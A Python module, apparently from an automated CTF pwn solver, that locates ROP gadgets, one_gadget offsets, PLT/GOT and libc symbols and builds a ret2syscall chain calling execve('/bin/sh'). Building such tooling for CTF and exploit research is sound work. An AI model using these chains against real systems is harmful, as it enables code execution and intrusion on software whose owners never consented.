#!/usr/bin/env python3
"""
Gadget查找模块
集成ROPgadget、one_gadget和pwntools ROP
"""

import os
import re
import json
import hashlib
import subprocess
from pwn import ELF, ROP, p64

_CACHE_DIR = os.path.join(os.path.expanduser('~'), '.pwnsolver_cache')


def _disk_cache_get(key):
    try:
        p = os.path.join(_CACHE_DIR, key + '.json')
        if os.path.exists(p):
            with open(p) as f:
                return json.load(f)
    except Exception:
        pass
    return None


def _disk_cache_put(key, value):
    try:
        os.makedirs(_CACHE_DIR, exist_ok=True)
        p = os.path.join(_CACHE_DIR, key + '.json')
        with open(p, 'w') as f:
            json.dump(value, f)
    except Exception:
        pass


def _file_key(path):
    try:
        st = os.stat(path)
        raw = f"{os.path.abspath(path)}:{st.st_mtime_ns}:{st.st_size}".encode()
        return hashlib.sha1(raw).hexdigest()
    except Exception:
        return hashlib.sha1(os.path.abspath(path).encode()).hexdigest()

class GadgetFinder:
    """Gadget查找器"""
    
    def __init__(self, binary_path, libc_path=None, verbose=True):
        self.binary_path = os.path.abspath(binary_path)
        self.libc_path = libc_path
        self.verbose = verbose
        self.elf = ELF(binary_path, checksec=False)
        
        if libc_path and os.path.exists(libc_path):
            self.libc = ELF(libc_path, checksec=False)
        else:
            self.libc = None
        
        self._cache = {}
        
    def log(self, msg):
        if self.verbose:
            print(f"  [gadgets] {msg}", flush=True)
    
    def find_rop_gadgets(self, target=None):
        """使用ROPgadget查找gadgets (磁盘缓存: binary path+mtime+size)"""
        target = target or self.binary_path
        if 'rop_gadgets' in self._cache:
            return self._cache['rop_gadgets']
        
        gadgets = []
        
        # 磁盘缓存
        cached = _disk_cache_get('rop_' + _file_key(target))
        if cached is not None:
            self._cache['rop_gadgets'] = cached
            return cached
        
        try:
            self.log(f"运行 ROPgadget --binary {os.path.basename(target)} ...")
            result = subprocess.run(
                ['ROPgadget', '--binary', target],
                capture_output=True, text=True, timeout=120
            )
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if ':' in line and '0x' in line:
                    gadgets.append(line)
            
            self.log(f"找到 {len(gadgets)} 个gadgets")
            _disk_cache_put('rop_' + _file_key(target), gadgets)
        except subprocess.TimeoutExpired:
            self.log("ROPgadget超时")
        except Exception as e:
            self.log(f"ROPgadget错误: {e}")
        
        self._cache['rop_gadgets'] = gadgets
        return gadgets
    
    def find_one_gadgets(self):
        """使用one_gadget查找execve gadgets (磁盘缓存)"""
        if 'one_gadgets' in self._cache:
            return self._cache['one_gadgets']
        
        gadgets = []
        target = self.libc_path
        
        if not target or not os.path.exists(target):
            self._cache['one_gadgets'] = gadgets
            return gadgets
        
        cached = _disk_cache_get('og_' + _file_key(target))
        if cached is not None:
            self._cache['one_gadgets'] = cached
            return cached
        
        try:
            self.log(f"运行 one_gadget {os.path.basename(target)} ...")
            result = subprocess.run(
                ['one_gadget', target],
                capture_output=True, text=True, timeout=30
            )
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line and '0x' in line:
                    match = re.match(r'(0x[0-9a-fA-F]+)\s+(.*)', line)
                    if match:
                        offset = int(match.group(1), 16)
                        constraints = match.group(2)
                        gadgets.append({
                            'offset': hex(offset),
                            'constraints': constraints.strip(),
                        })
            
            self.log(f"找到 {len(gadgets)} 个one_gadget")
            _disk_cache_put('og_' + _file_key(target), gadgets)
        except subprocess.TimeoutExpired:
            self.log("one_gadget超时")
        except FileNotFoundError:
            self.log("one_gadget未安装")
        except Exception as e:
            self.log(f"one_gadget错误: {e}")
        
        self._cache['one_gadgets'] = gadgets
        return gadgets
    
    def get_specific_gadgets(self):
        """使用pwntools ROP获取特定常用gadgets
        
        specific 只包含 **binary 自身** 的 gadget 地址(可直接 p64 使用);
        libc 中的 gadget 以 `libc_` 前缀保存(相对偏移, 需加 libc 基址)。
        另附 PLT/GOT 引用 (puts_plt, puts_got 等) 供模板判断输出能力。
        """
        specific = {
            'pop_rdi': None,
            'pop_rsi': None,
            'pop_rdx': None,
            'pop_rax': None,
            'ret': None,
            'syscall': None,
            # libc 相对偏移 (需 libc.address)
            'libc_pop_rdi': None,
            'libc_pop_rsi': None,
            'libc_pop_rdx': None,
            'libc_pop_rax': None,
            'libc_ret': None,
            'libc_syscall': None,
            # PLT/GOT 引用
            'puts_plt': None, 'write_plt': None, 'printf_plt': None,
            'read_plt': None, 'gets_plt': None,
            'puts_got': None, 'write_got': None, 'printf_got': None,
            'read_got': None, 'gets_got': None,
        }
        
        # PLT/GOT 引用 (直接可用, 不受架构影响)
        for name in self.elf.plt:
            specific[f'{name}_plt'] = self.elf.plt[name]
        for name in self.elf.got:
            specific[f'{name}_got'] = self.elf.got[name]

        try:
            # 使用pwntools ROP - 从binary
            # 注意: ROP(elf) 可能从linker找到gadgets — 验证地址在binary的LOAD段内
            rop = ROP(self.elf)
            # 获取binary的代码LOAD段范围 (PT_LOAD with PF_X)
            text_start = 0
            text_end = 0
            for seg in self.elf.segments:
                if seg.header.p_type == 'PT_LOAD' and seg.header.p_flags & 1:  # PF_X
                    text_start = seg.header.p_vaddr
                    text_end = text_start + seg.header.p_memsz
                    break
            if not text_start:  # Fallback: use .text if available
                st = self.elf.get_section_by_name('.text')
                if st:
                    text_start = st.header.sh_addr
                    text_end = text_start + st.header.sh_size
            self.log(f"  [gadgets] Binary code range: {hex(text_start)}-{hex(text_end)}")
            
            def _in_binary(addr):
                return text_start <= addr < text_end if text_start else True
            
            if rop.rdi and _in_binary(rop.rdi.address):
                specific['pop_rdi'] = rop.rdi.address
            if rop.rsi and _in_binary(rop.rsi.address):
                specific['pop_rsi'] = rop.rsi.address
            if rop.rdx and _in_binary(rop.rdx.address):
                specific['pop_rdx'] = rop.rdx.address
            if rop.rax and _in_binary(rop.rax.address):
                specific['pop_rax'] = rop.rax.address
            
            # 找ret gadget
            for g in rop.gadgets.values():
                if list(g.insns) == ['ret'] and _in_binary(g.address):
                    specific['ret'] = g.address
                    break
            
            # 找syscall (pwntools ROP only finds syscall;ret, also search raw disasm)
            for g in rop.gadgets.values():
                if any('syscall' in i for i in g.insns) and _in_binary(g.address):
                    specific['syscall'] = g.address
                    break
            # Fallback: search disassembly for bare syscall
            if not specific['syscall']:
                try:
                    result = subprocess.run(
                        ['objdump', '-d', '-M', 'intel', self.binary_path],
                        capture_output=True, text=True, timeout=10
                    )
                    for m in re.finditer(r'^\s*([0-9a-f]+):\s+.*\tsyscall\s*$', 
                                         result.stdout, re.MULTILINE):
                        addr = int(m.group(1), 16)
                        specific['syscall'] = addr
                        break
                except Exception:
                    pass
            
            self.log(f"Binary gadgets: pop_rdi={'OK' if specific['pop_rdi'] else 'NO'}, "
                     f"ret={'OK' if specific['ret'] else 'NO'}")
            
            # 如果binary中没有，从libc中找 (存为相对偏移, 使用时需加基址)
            if self.libc:
                try:
                    rop_libc = ROP(self.libc)
                    if not specific['libc_pop_rdi'] and rop_libc.rdi:
                        specific['libc_pop_rdi'] = rop_libc.rdi.address
                    if not specific['libc_pop_rsi'] and rop_libc.rsi:
                        specific['libc_pop_rsi'] = rop_libc.rsi.address
                    if not specific['libc_pop_rax'] and rop_libc.rax:
                        specific['libc_pop_rax'] = rop_libc.rax.address
                    if not specific['libc_pop_rdx'] and rop_libc.rdx:
                        specific['libc_pop_rdx'] = rop_libc.rdx.address
                    if not specific['libc_ret']:
                        for g in rop_libc.gadgets.values():
                            if list(g.insns) == ['ret']:
                                specific['libc_ret'] = g.address
                                break
                    if not specific['libc_syscall']:
                        for g in rop_libc.gadgets.values():
                            if any('syscall' in i for i in g.insns):
                                specific['libc_syscall'] = g.address
                                break
                    self.log(f"libc gadgets: pop_rdi={hex(specific['libc_pop_rdi']) if specific['libc_pop_rdi'] else 'NO'} "
                             f"ret={hex(specific['libc_ret']) if specific['libc_ret'] else 'NO'}")
                except Exception as e:
                    self.log(f"libc ROP搜索错误: {e}")
        except Exception as e:
            self.log(f"pwntools ROP错误: {e}")
        
        # 最后的fallback: 从ROPgadget输出中搜索
        # binary 来源 → specific[pop_*]; libc 来源 → specific[libc_pop_*] (相对偏移)
        if not specific['pop_rdi'] or not specific['libc_pop_rdi']:
            for target_gadgets_key in ['rop_gadgets', 'libc_rop_gadgets']:
                gadgets = self._cache.get(target_gadgets_key, [])
                if not gadgets and target_gadgets_key == 'libc_rop_gadgets' and self.libc:
                    gadgets = self.find_rop_gadgets(self.libc_path)
                    self._cache['libc_rop_gadgets'] = gadgets
                if not gadgets:
                    continue
                is_libc = (target_gadgets_key == 'libc_rop_gadgets')
                for g in gadgets:
                    if ':' not in g:
                        continue
                    addr_str, insns = g.split(':', 1)
                    insns = insns.strip().lower()
                    try:
                        addr = int(addr_str.strip(), 16)
                    except ValueError:
                        continue
                    if is_libc:
                        if not specific['libc_pop_rdi'] and 'pop rdi' in insns and 'ret' in insns and 'call' not in insns:
                            specific['libc_pop_rdi'] = addr
                        if not specific['libc_pop_rsi'] and 'pop rsi' in insns and 'ret' in insns and 'call' not in insns:
                            specific['libc_pop_rsi'] = addr
                        if not specific['libc_pop_rdx'] and 'pop rdx' in insns and 'ret' in insns and 'call' not in insns:
                            specific['libc_pop_rdx'] = addr
                        if not specific['libc_ret'] and insns == 'ret':
                            specific['libc_ret'] = addr
                    else:
                        if not specific['pop_rdi'] and 'pop rdi' in insns and 'ret' in insns and 'call' not in insns:
                            specific['pop_rdi'] = addr
                        if not specific['pop_rsi'] and 'pop rsi' in insns and 'ret' in insns and 'call' not in insns:
                            specific['pop_rsi'] = addr
                        if not specific['pop_rdx'] and 'pop rdx' in insns and 'ret' in insns and 'call' not in insns:
                            specific['pop_rdx'] = addr
                        if not specific['ret'] and insns == 'ret':
                            specific['ret'] = addr
        
        return specific
    
    def get_plt_got(self):
        """获取PLT/GOT地址"""
        elf = self.elf
        
        plt = {}
        for name in elf.plt:
            plt[name] = elf.plt[name]
        
        got = {}
        for name in elf.got:
            got[name] = elf.got[name]
        
        return {'plt': plt, 'got': got}
    
    def get_libc_base_info(self):
        """获取libc基地址相关信息"""
        info = {}
        
        if self.libc:
            info['libc_path'] = self.libc_path
            info['system'] = hex(self.libc.symbols.get('system', 0))
            info['execve'] = hex(self.libc.symbols.get('execve', 0))
            info['str_bin_sh'] = hex(next(self.libc.search(b'/bin/sh'), 0))
            
            for sym in ['puts', 'printf', 'write', 'read', 'gets']:
                addr = self.libc.symbols.get(sym, 0)
                if addr:
                    info[sym] = hex(addr)
        
        return info
    
    def collect_all(self):
        """收集所有gadgets和地址信息"""
        self.log("收集所有gadgets...")
        
        specific = self.get_specific_gadgets()
        
        # 检查pop_rdi是否在binary地址空间中（非libc）
        pop_rdi_val = specific.get('pop_rdi')
        pop_rdi_in_binary = False
        if pop_rdi_val and self.elf:
            for seg in self.elf.segments:
                if seg.header.p_type == 'PT_LOAD':
                    lo = seg.header.p_vaddr
                    hi = lo + seg.header.p_memsz
                    if lo <= pop_rdi_val < hi:
                        pop_rdi_in_binary = True
                        break
        
        result = {
            'rop_gadgets': self.find_rop_gadgets(),
            'one_gadgets': self.find_one_gadgets(),
            'specific': specific,
            'pop_rdi_in_binary': pop_rdi_in_binary,
            'plt': self.get_plt_got()['plt'],
            'got': self.get_plt_got()['got'],
            'libc_info': self.get_libc_base_info(),
        }
        
        return result
    
    # ========== 新增方法 (基于元旦水友赛WP) ==========
    
    def find_xor_gadgets(self):
        """查找xor清零gadgets (s.s.a.l技巧: xor rdx,[rsp+8]; 通过栈上数据控制rdx)
        
        返回格式: {'xor_rdx_rsp': addr, 'xor_eax_eax': addr, ...}
        """
        gadgets = self._cache.get('rop_gadgets', []) or self.find_rop_gadgets()
        if self.libc:
            gadgets += self._cache.get('libc_rop_gadgets', []) or self.find_rop_gadgets(self.libc_path)
        
        xor_gadgets = {}
        
        for g in gadgets:
            if ':' not in g:
                continue
            try:
                addr_str = g.split(':')[0].strip()
                addr = int(addr_str, 16)
            except ValueError:
                continue
            insns = g.split(':', 1)[1].strip().lower() if ':' in g else ''
            
            # xor rdx, [rsp+8] — 通过栈上值控制rdx
            if 'xor rdx' in insns and 'rsp' in insns:
                xor_gadgets['xor_rdx_rsp'] = addr
            
            # xor eax, eax; ret — 清零rax
            if 'xor eax, eax' in insns and 'ret' in insns:
                xor_gadgets['xor_eax_eax'] = addr
            
            # xor edx, edx — 清零rdx (用于open O_RDONLY)
            if 'xor edx, edx' in insns:
                xor_gadgets['xor_edx_edx'] = addr
        
        return xor_gadgets
    
    def find_setcontext_gadget(self):
        """查找libc中的setcontext gadget (Heap_Harmony技巧)
        
        setcontext+0x?? 用于控制寄存器后跳转
        常见偏移: setcontext+53 (2.27), setcontext+61 (2.31)
        """
        if not self.libc:
            return None
        
        setcontext_addr = self.libc.symbols.get('setcontext', 0)
        if not setcontext_addr:
            # 尝试通过readelf/got查找
            try:
                result = subprocess.run(
                    ['readelf', '-s', self.libc_path],
                    capture_output=True, text=True, timeout=10
                )
                for line in result.stdout.split('\n'):
                    if 'setcontext' in line and 'FUNC' in line:
                        parts = line.split()
                        for p in parts:
                            try:
                                setcontext_addr = int(p, 16)
                                break
                            except ValueError:
                                continue
            except Exception:
                pass
        
        if not setcontext_addr:
            return None
        
        # 在libc中搜索 setcontext+? 附近的gadgets
        # setcontext+53: mov rsp,[rdi+0A0h] ; ... ; ret
        # setcontext+61: 类似但不同偏移
        candidates = []
        
        for offset in range(0x30, 0x80):
            try:
                target = setcontext_addr + offset
                disasm = self._disasm_addr(self.libc_path, target)
                if 'mov rsp' in disasm.lower() or 'push' in disasm.lower():
                    candidates.append({
                        'name': f'setcontext+{offset}',
                        'addr': target,
                        'offset': offset,
                    })
                if len(candidates) >= 3:
                    break
            except Exception:
                continue
        
        return {
            'setcontext_base': setcontext_addr,
            'candidates': candidates,
        } if candidates else {'setcontext_base': setcontext_addr, 'candidates': []}
    
    def find_register_clearing_gadgets(self):
        """查找寄存器清零gadgets (yes_or_no技巧: 清除r12/r15满足one_gadget约束)
        
        返回: {'pop_r12': addr, 'pop_r15': addr, 'pop_r12_r13': addr, ...}
        """
        gadgets = self._cache.get('rop_gadgets', []) or self.find_rop_gadgets()
        if self.libc:
            gadgets += self._cache.get('libc_rop_gadgets', []) or self.find_rop_gadgets(self.libc_path)
        
        clearing = {}
        
        for g in gadgets:
            if ':' not in g:
                continue
            try:
                addr = int(g.split(':')[0].strip(), 16)
            except ValueError:
                continue
            insns = g.split(':', 1)[1].strip().lower() if ':' in g else ''
            
            # pop r12; ... ret
            if 'pop r12' in insns and 'ret' in insns and 'call' not in insns:
                clearing['pop_r12'] = addr
            # pop r15; ... ret
            if 'pop r15' in insns and 'ret' in insns and 'call' not in insns:
                clearing['pop_r15'] = addr
            # pop r14; ... ret
            if 'pop r14' in insns and 'ret' in insns and 'call' not in insns:
                clearing['pop_r14'] = addr
            # pop rbx; ret (通用寄存器清零)
            if 'pop rbx' in insns and 'ret' in insns and 'call' not in insns:
                clearing['pop_rbx'] = addr
        
        return clearing
    
    def find_pop_rsi_rdi_gadget(self):
        """查找 pop rsi; pop rdi; ret 组合gadget (s.s.a.l技巧)
        
        这种gadget能同时设置rsi和rdi两个参数
        """
        gadgets = self._cache.get('rop_gadgets', []) or self.find_rop_gadgets()
        if self.libc:
            gadgets += self._cache.get('libc_rop_gadgets', []) or self.find_rop_gadgets(self.libc_path)
        
        for g in gadgets:
            if ':' not in g:
                continue
            try:
                addr = int(g.split(':')[0].strip(), 16)
            except ValueError:
                continue
            insns = g.split(':', 1)[1].strip().lower() if ':' in g else ''
            
            # pop rsi; pop r15; ret 或 pop rsi; pop rdi; ret
            if 'pop rsi' in insns and 'pop rdi' in insns and 'ret' in insns:
                # 确保没有call干扰
                if 'call' not in insns:
                    return addr
        
        return None
    
    def generate_ret2syscall_chain(self, binsh_addr=0x601090):
        """生成ret2syscall ROP链 (s.s.a.l风格)
        
        构造: rax=0x3b (execve), rdi="/bin/sh", rsi=0, rdx=0 → syscall
        
        需要gadgets:
        - pop_rax; ret
        - pop_rdi; ret
        - pop_rsi; ret (或 pop_rsi_pop_rdi)
        - 清零rdx的方法 (xor rdx,[rsp+8] 或 pop rdx; ret)
        - syscall; ret
        """
        specific = self.get_specific_gadgets()
        xor_gadgets = self.find_xor_gadgets()
        pop_rsi_rdi = self.find_pop_rsi_rdi_gadget()
        
        missing = []
        for name in ['pop_rax', 'pop_rdi']:
            if not specific.get(name):
                missing.append(name)
        if not specific.get('syscall'):
            missing.append('syscall')
        
        # rsi可以通过pop_rsi_rdi或单独pop_rsi
        has_rsi = specific.get('pop_rsi') or pop_rsi_rdi
        if not has_rsi:
            missing.append('pop_rsi')
        
        # rdx清零方法
        has_rdx_clear = bool(xor_gadgets.get('xor_edx_edx') or 
                             xor_gadgets.get('xor_rdx_rsp') or
                             specific.get('pop_rdx'))
        
        if missing:
            return {'error': f'缺少gadgets: {missing}', 'missing': missing,
                    'specific': specific, 'xor_gadgets': xor_gadgets}
        
        chain_info = {
            'method': 'ret2syscall (s.s.a.l style)',
            'pop_rax': specific['pop_rax'],
            'pop_rdi': specific['pop_rdi'],
            'pop_rsi': specific.get('pop_rsi'),
            'pop_rsi_rdi': pop_rsi_rdi,
            'syscall': specific['syscall'],
            'binsh_addr': binsh_addr,
            'xor_gadgets': xor_gadgets,
            'has_rdx_clear': has_rdx_clear,
        }
        
        # 构造payload
        chain = b''
        # Step 1: rax = 0x3b (execve syscall number)
        chain += p64(specific['pop_rax']) + p64(0x3b)
        # Step 2: rdi = binsh_addr
        chain += p64(specific['pop_rdi']) + p64(binsh_addr)
        # Step 3: rsi = 0
        if pop_rsi_rdi:
            chain += p64(pop_rsi_rdi) + p64(0) + p64(0)  # rsi=0, rdi会被后覆盖
        elif specific.get('pop_rsi'):
            chain += p64(specific['pop_rsi']) + p64(0)
        # Step 4: rdx = 0 (多种方法)
        if xor_gadgets.get('xor_edx_edx'):
            chain += p64(xor_gadgets['xor_edx_edx'])
        elif xor_gadgets.get('xor_rdx_rsp'):
            # xor rdx,[rsp+8] → 栈上放0
            # gadget: xor rdx,[rsp+8]; ... ; ret
            # 需要在rsp+8放0，但后面是syscall地址，无法控制
            pass  # 复杂，留给调用者处理
        elif specific.get('pop_rdx'):
            chain += p64(specific['pop_rdx']) + p64(0)
        # Step 5: syscall
        chain += p64(specific['syscall'])
        
        chain_info['chain'] = chain
        chain_info['chain_len'] = len(chain)
        return chain_info
    
    def _disasm_addr(self, target_path, addr):
        """反汇编指定地址附近的代码"""
        try:
            result = subprocess.run(
                ['objdump', '-d', '-M', 'intel',
                 f'--start-address=0x{addr:x}',
                 f'--stop-address=0x{addr+0x30:x}',
                 target_path],
                capture_output=True, text=True, timeout=10
            )
            return result.stdout
        except Exception:
            return ""
